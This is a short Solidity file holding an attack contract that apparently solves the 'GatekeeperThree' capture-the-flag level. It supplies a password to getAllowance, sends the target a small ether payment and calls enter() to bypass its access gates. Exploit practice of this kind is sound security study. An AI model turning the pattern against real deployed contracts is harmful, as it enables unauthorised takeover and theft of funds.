// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeAttack {
    GatekeeperThree target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function run(uint256 password) public payable {
        target.getAllowance(password);

        uint256 amount = 0.001 ether + 1 wei;
        (bool ok,) = address(target).call{value: amount}("");
        require(ok, "Failed to send Ether");

        target.enter();
    }
}
